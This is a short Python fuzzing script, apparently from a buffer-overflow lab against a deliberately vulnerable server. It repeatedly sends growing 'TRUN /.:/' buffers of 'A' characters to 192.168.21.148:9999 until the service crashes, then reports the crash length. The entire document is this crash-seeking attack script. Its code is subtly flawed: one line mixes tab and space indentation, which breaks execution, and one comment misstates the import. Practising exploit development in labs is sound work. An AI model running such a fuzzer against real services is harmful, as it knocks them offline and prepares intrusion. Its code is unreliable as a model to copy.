#!/usr/bin/python3
import argparse
import sys, socket      # importing modules
from time import sleep  # importing time from module sleep
buffer = "A"*100;       # defining a variable buffer
while True:             #running a loop as long as it's true
    try:
        # Creating a socket object
        # AF_INET : IPv4
        # SOCK_STREAM : TCP
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
        # Connect to this IP at this port
        s.connect(("192.168.21.148",9999));
        # Send the data
        s.send(("TRUN /.:/" +  buffer).encode());
        s.close();
        sleep(1);
        # Increasing the buffer size
        buffer = buffer + "A"*100;
    except:
        # Printing the length at which the application crashes
        print("Fuzzing Crashed at " + str(len(buffer)));
        sys.exit();
